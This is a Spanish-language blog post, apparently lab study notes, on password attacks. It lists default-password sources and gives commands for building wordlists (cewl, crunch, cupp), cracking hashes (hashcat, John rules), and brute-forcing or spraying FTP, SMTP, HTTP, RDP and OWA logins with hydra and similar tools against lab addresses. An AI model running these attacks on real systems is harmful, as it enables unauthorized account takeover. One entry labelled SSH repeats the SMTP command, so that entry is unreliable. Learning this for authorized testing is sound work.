---
layout: post
author: Sergio Salgado
---
# [](#header-1)Ataque de contrasenas


## [](#header-2)Perfilamiento de contrasenas

### [](#header-3)Contrasenas por default
Aqui hay unos sitios donde podemos encontrar contrasenas por default
- https://cirt.net/passwords
- https://default-password.info/
- https://datarecovery.com/rd/default-passwords/

### [](#header-3)Contrasenas debiles

- https://wiki.skullsecurity.org/index.php?title=Passwords
- Seclist de github por Daniel

### [](#header-3)Combinacion de wordlists
```s
cat file1.txt file2.txt file3.txt > combined_list.txt
#Eliminar duplicados
sort combined_list.txt | uniq -u > cleaned_combined_list.txt
```
### [](#header-3)Wordlists Personalizada
Para saber mas sobre la comania y hacer un crawling a los subdominios:
```s
cewl -w list.txt -d 5 -m 5 http://thm.labs
```
### [](#header-3)Wordlist de usuario

```s
git clone https://github.com/therodri2/username_generator.git
#creamos una lsita de nombres de usuario
echo "John Smith" > users.lst
#Generamos la wordlist
python3 username_generator.py -w users.lst
```
## [](#header-2)Perfilamiento de contrasenas

Para crear una wordlist automatizada con una regla de caracteres, tenemos la herramienta crunch.
La cual se puede usar de la forma:
```s
crunch 2 2 01234abcd -o crunch.txt
```
Tambien esta la herramienta de python3 cupp https://github.com/Mebus/cupp y se usa para perfilar a los usuarios realizando preguntas iteractivamente.
```s
python3 cupp.py -i
```

## [](#header-2)Ataques de diccionario
Antes de empezar, es comun tener un hash y no saber que tipo de hash sea para poder crackearlo, para eso podemos usar la herramienta hashid o hash-identifier
```s
hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show
```
## [](#header-2)Diccionario basados en reglas

#Para listar las reglas de john
```s
cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF

#Para usar la lista que combiarte letras en logicos simbolos
john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
```

Podemos crear nuestra propia regla al final del archivo john.conf 
```s
sudo vi /etc/john/john.conf 
```

## [](#header-2)Ataques en linea
Con hydra podemos atacar varios vecotores

FTP
hydra -l ftp -P passlist.txt ftp://10.10.x.x

SSH
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 

SMTP
hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v 

HTTP login pages
hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f 

RDP
Tenemos la herramienta de python3 https://github.com/xFreed0m/RDPassSpray

python3 RDPassSpray.py -u victim -p Spring2021! -t 10.100.10.240:3026

Outlook web access (OWA) portal
- https://github.com/byt3bl33d3r/SprayingToolkit
- https://github.com/dafthack/MailSniper

